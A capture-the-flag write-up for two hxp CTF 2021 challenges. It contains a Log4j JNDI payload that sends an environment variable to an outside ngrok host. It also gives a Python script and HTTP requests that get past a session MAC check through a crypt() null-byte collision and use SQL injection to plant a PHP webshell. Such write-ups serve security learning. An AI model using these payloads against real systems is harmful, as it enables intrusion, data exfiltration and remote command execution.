# hxp CTF 2021

| Challenge                                                | Category | Points |
| -------------------------------------------------------- | -------- | ------ |
| [Log 4 Sanity Check](hxp-ctf-2021.md#log-4-sanity-check) | Misc     |        |
| [Shitty Blog](hxp-ctf-2021.md#shitty-blog)               | Web      |        |

## Log 4 Sanity Check

{% file src="../.gitbook/assets/Log 4 sanity check-9afb8a24feb86db1.tar.xz" %}

We could see that the vulnerable `log4j` library is used to log the user input when it is "wrong".

```java
/* Decompiler 2ms, total 1137ms, lines 28 */
import java.util.Scanner;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Vuln {
   public static void main(String[] var0) {
      try {
         Logger var1 = LogManager.getLogger(Vuln.class);
         System.out.println("What is your favourite CTF?");
         String var2 = (new Scanner(System.in)).next();
         if (var2.toLowerCase().contains("dragon")) {
            System.out.println("<3");
            System.exit(0);
         }

         if (var2.toLowerCase().contains("hxp")) {
            System.out.println(":)");
         } else {
            System.out.println(":(");
            var1.error("Wrong answer: {}", var2);
         }
      } catch (Exception var3) {
         System.err.println(var3);
      }

   }
}
```

I wasn't able to get full-on RCE, but information disclosure through [this vector](https://twitter.com/Rayhan0x01/status/1469571563674505217) was sufficient! We could use `${env:FOO}` to substitute the `FOO` environment variable into the URI.

```
$ ~ nc 65.108.176.77 1337
What is your favourite CTF?
${jndi:ldap://8.tcp.ngrok.io:16804/${env:FLAG}}
:(
```

We just have to start an LDAP server and listen for the queried URI.

`hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}`

## Shitty Blog

{% file src="../.gitbook/assets/shitty blog 🤎-a6c0b8b672817005.tar.xz" %}

We could see that when inserting entries, the `user_id` is not validated. This is also directly substituted into the SQL query, allowing an SQL injection.

Interestingly, `get_user` uses `$db->query`, while `delete_entry` uses `$db->exec`. The `exec()` function allows multiline (stacked) queries, allowing us to use [this RCE payload](https://research.checkpoint.com/2019/select-code\_execution-from-using-sqlite/) to upload a webshell.

```php
function get_user($db, $user_id) : string {
    foreach($db->query("SELECT name FROM user WHERE id = {$user_id}") as $user) {
        return $user['name'];
    }
    return 'me';
}

...

function delete_entry($db, $entry_id, $user_id) {
    $db->exec("DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}");
}

...

if(isset($_POST['content'])) {
    insert_entry($db, htmlspecialchars($_POST['content']), $id);

    header('Location: /');
    exit;
}

$entries = get_entries($db);

if(isset($_POST['delete'])) {
    foreach($entries as $key => $entry) {
        if($_POST['delete'] === $entry['id']){
            delete_entry($db, $entry['id'], $entry['user_id']);
            break;
        }
    }

    header('Location: /');
    exit;
}
```

The difficulty lies in bypassing the following validation to insert a custom `$id` from the `session` cookie.

```php
$secret = 'SECRET_PLACEHOLDER';
$salt = '$6$'.substr(hash_hmac('md5', $_SERVER['REMOTE_ADDR'], $secret), 16).'$';

if(! isset($_COOKIE['session'])){
    $id = random_int(1, PHP_INT_MAX);
    $mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);
}
else {
    $session = explode('|', $_COOKIE['session']);
    if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
        exit();
    }
    $id = $session[0];
    $mac = $session[1];
}
```

Notice that in `hash_hmac()`, `binary=true` is set but `crypt()` is [not binary safe](https://www.reddit.com/r/PHP/comments/t0qzl/is\_this\_a\_bug\_shouldnt\_crypt\_be\_binary\_safe/) - the function only processes the input string up to a null byte terminator!

It would therefore be trivial to find two `$id` numbers that produce the same `$mac` by bruteforcing - this happens when `hash_hmac()` returns a result starting with `\x00`.

```python
def find_collision():
    """
    Find an instance where two IDs produce '\x00' at the beginning of the hash_hmac() output,
    resulting in crypt(), which is a non binary safe function, returning the same value.

    Returns the MAC that corresponds to this result.
    """
    results = {}

    while True:
        r = requests.get(URL)
        cookie = r.headers['Set-Cookie'].split('=')[1]
        cookie = urllib.parse.unquote(cookie)

        id, mac = cookie.split('|')
        print(id, mac)
        
        if mac in results:
            return mac

        results[mac] = id
```

Since this `$mac` corresponds to the case where `hash_hmac()` returns a result starting with `\x00`, we would be able to bypass the following validation by using this `$mac` value in our session cookie, while changing the `$id` value in our session cookie until its HMAC starts with `\x00`.

```php
hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])
```

This can be done by appending different things to the end of the payload (after an SQL comment) until we get a valid value. This value will produce a `crypt()` result corresponding to the `$mac` found previously.

```python
def find_exploit_collision(exploit, mac):
    """
    Finds a collision with the exploit user ID string. Appends stuff to the back of the string until
    the hash_hmac() output begins with '\x00'.
    """
    i = 0
    exploit = urllib.parse.quote_plus(exploit).replace('+', ' ')
    while True:

        print(i)

        tmp = exploit + str(i)

        # Test if the hash_hmac() output begins with '\x00' (if it does, then the MAC is valid)
        r = requests.get(URL, cookies={'session': tmp + '|' + mac})
        if "My shitty Blog" in r.text:
            return tmp

        i += 1
```

The full script to generate the exploit payload is as follows:

```python
import requests
import urllib.parse

URL = "http://65.108.176.96:8888/"

def find_collision():
    """
    Find an instance where two IDs produce '\x00' at the beginning of the hash_hmac() output,
    resulting in crypt(), which is a non binary safe function, returning the same value.

    Returns the MAC that corresponds to this result.
    """
    results = {}

    while True:
        r = requests.get(URL)
        cookie = r.headers['Set-Cookie'].split('=')[1]
        cookie = urllib.parse.unquote(cookie)

        id, mac = cookie.split('|')
        print(id, mac)
        
        if mac in results:
            return mac

        results[mac] = id

    
def find_exploit_collision(exploit, mac):
    """
    Finds a collision with the exploit user ID string. Appends stuff to the back of the string until
    the hash_hmac() output begins with '\x00'.
    """
    i = 0
    exploit = urllib.parse.quote_plus(exploit).replace('+', ' ')
    while True:

        print(i)

        tmp = exploit + str(i)

        # Test if the hash_hmac() output begins with '\x00' (if it does, then the MAC is valid)
        r = requests.get(URL, cookies={'session': tmp + '|' + mac})
        if "My shitty Blog" in r.text:
            return tmp

        i += 1


# mac = find_collision()
mac = "QAhL.MoHxwRM3Bt/pMvSrjxnRCAxaim7VAtMVwCnNgsjtlWO3AKBcd1WY9NYPrxtUrTluTorPK4laJKcJydWB0"
print(f"Found MAC: {mac}")

exploit = find_exploit_collision("20 or 1=1; ATTACH DATABASE '/var/www/html/data/nice.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>');#", mac)
print(f"Found exploit: {exploit}")

print(f"Set session cookie: {exploit}|{mac}")
```

Once we obtain the payload, we first have to create an entry with the malicious user ID payload.

```http
POST / HTTP/1.1
Host: 65.108.176.96
Cookie: session=20 or 1%3D1%3B ATTACH DATABASE %27%2Fvar%2Fwww%2Fhtml%2Fdata%2Fnice.php%27 AS lol%3B CREATE TABLE lol.pwn %28dataz text%29%3B INSERT INTO lol.pwn %28dataz%29 VALUES %28%27%3C%3Fphp system%28%24_GET%5B%22cmd%22%5D%29%3B %3F%3E%27%29%3B%23178|QAhL.MoHxwRM3Bt/pMvSrjxnRCAxaim7VAtMVwCnNgsjtlWO3AKBcd1WY9NYPrxtUrTluTorPK4laJKcJydWB0
Connection: close
Content-Length: 12

content=test
```

Next, we simply delete the created entry. This is when the user ID payload is substituted into the SQL query, causing a PHP file to be created.

```http
POST / HTTP/1.1
Host: 65.108.176.96
Cookie: session=20 or 1%3D1%3B ATTACH DATABASE %27%2Fvar%2Fwww%2Fhtml%2Fdata%2Fnice.php%27 AS lol%3B CREATE TABLE lol.pwn %28dataz text%29%3B INSERT INTO lol.pwn %28dataz%29 VALUES %28%27%3C%3Fphp system%28%24_GET%5B%22cmd%22%5D%29%3B %3F%3E%27%29%3B%23178|QAhL.MoHxwRM3Bt/pMvSrjxnRCAxaim7VAtMVwCnNgsjtlWO3AKBcd1WY9NYPrxtUrTluTorPK4laJKcJydWB0
Connection: close
Content-Length: 12

content=test
```

Next, we simply have to visit our webshell to get the flag.

```http
GET /data/nice.php?cmd=/readflag HTTP/1.1
Host: 65.108.176.96:8888
Cookie: session=20 or 1%3D1%3B ATTACH DATABASE %27%2Fvar%2Fwww%2Fhtml%2Fdata%2Fnice.php%27 AS lol%3B CREATE TABLE lol.pwn %28dataz text%29%3B INSERT INTO lol.pwn %28dataz%29 VALUES %28%27%3C%3Fphp system%28%24_GET%5B%22cmd%22%5D%29%3B %3F%3E%27%29%3B%23598|dW8W.oyZd9VSfcnVaiWE2c8pYNHaOyXhBIzpXc2TTCPlPzvRdcHvMA8..6O2AftmrQYa287BZgFsLd9/Ki0ik/
Connection: close
```

`hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}`
